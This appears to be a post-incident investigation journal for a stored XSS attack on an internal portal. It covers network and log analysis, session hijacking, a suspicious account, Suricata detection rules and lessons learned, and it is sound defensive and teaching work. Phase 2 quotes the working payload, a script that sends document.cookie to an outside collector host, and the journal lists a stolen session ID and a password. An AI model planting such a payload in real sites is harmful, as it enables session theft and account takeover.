# Investigation Journal: INC-2026-006

**Honesty note:** this journal is a post-analysis reconstruction, not a real-time logbook. It restructures and narrates the investigation as it was actually carried out, based on the evidence and the commands run. No detail is fabricated; where the evidence did not support a firm conclusion, that is stated.

---

## Starting point

The engagement opened with the evidence bundle for INC-2026-006: a network capture (attack.pcap), the portal access log (web_access.log), and a README. The brief framed a stored XSS incident on NexaPortal (bru-web-02, 192.168.10.24), a portal launched two weeks earlier without a security review. The README gave approximate timings (reconnaissance around 17:30 CEST, beacon around 17:50:59 CEST) that the evidence later refined.

The key methodological point was set early: the access log records requests in UTC, while the capture records in CEST (UTC plus two). Every timestamp in the deliverables is given in both to avoid misattribution.

## Phase 1: network analysis

I started with the capture to find the outbound channel. A conversation analysis isolated a single external IP, 91.92.100.45, talking to the portal and receiving a beacon on a non-standard port. Following the beacon flow gave the collector endpoint directly: an HTTP request to `91.92.100.45:8080/collect` carrying a Base64 parameter. Decoding that parameter returned the stolen value, `PHPSESSID=5e81c7a60ec649201724184a1996dae8`. The collector IP, port 8080, and the `/collect` endpoint became the first three indicators.

## Phase 2: application trace

I then turned to web_access.log and the request side of the capture to find what planted the script. The injection was a `POST /portal/feedback.php`. Recovering the POST body from the capture (hex then URL decoded) gave the payload in full: a `<script>` tag calling `fetch('http://91.92.100.45:8080/collect?c='+btoa(document.cookie))`. The portal stored that input and rendered it back without output encoding, which is the defining trait of stored (persistent) XSS. The access log also corrected the README: the first attacker contact was at 08:32:25 UTC (10:32:25 CEST), several hours earlier than the README implied, so the real compromise window is wider than reported.

## Phase 3: impact

The trigger and impact came together from the timeline. Victim p.dumont authenticated at 15:45:54 UTC from workstation 192.168.10.110, loaded the feedback page at 15:50:58 UTC, and the beacon fired two seconds later at 15:51:00 UTC: the stored script executing in p.dumont's authenticated session. With the stolen PHPSESSID, the attacker replayed the session from 91.92.100.45 around 15:52 UTC and accessed the portal as p.dumont, no password required.

The login POST bodies also exposed an account, m.renard, authenticating from the attacker IP and matching no NexaCorp employee directory entry. Its password (`Renard2026!`) follows the same pattern as legitimate accounts (`Lambert2026!`), which leaves two readings open: an attacker-created foothold, or a pre-existing account that was compromised and reused. The evidence does not settle which. I recorded it as undetermined rather than forcing a conclusion, while noting that both readings lead to the same action: treat the account as unauthorized and remove it. A behavioral signal supported attribution throughout: all attacker traffic used a Firefox on Linux user agent, against a Windows fleet running Chrome and Edge.

## Phase 4: detection engineering

The final phase was authoring two Suricata rules, validated by replaying the capture (`attack_eth.pcap`):

- **SID 1000001** inspects the HTTP request body for the `script` marker present in the malicious feedback submission. Alerts: 1.
- **SID 1000002** targets outbound HTTP to the collector (91.92.100.45:8080) on the `/collect` endpoint. Alerts: 1.

Total alerts against the capture: 2 (one injection, one beacon), covering the full chain with no false positives on the captured traffic.

## Lessons learned

- Start from the exfiltration channel. Following the beacon flow in the capture surfaced the collector and the stolen cookie before the injection vector was even confirmed, which framed the rest of the analysis.
- Trust the evidence over the bundle README. The README understated the compromise window by several hours; the access log is the authoritative source for first contact.
- State undetermined findings as undetermined. The origin of m.renard cannot be proven from the available evidence; documenting both hypotheses is more credible than picking one, and the remediation is the same either way.
- HttpOnly would have broken this chain. The exfiltration depends on JavaScript reading `document.cookie`; an HttpOnly session cookie defeats it even if the script still executes.
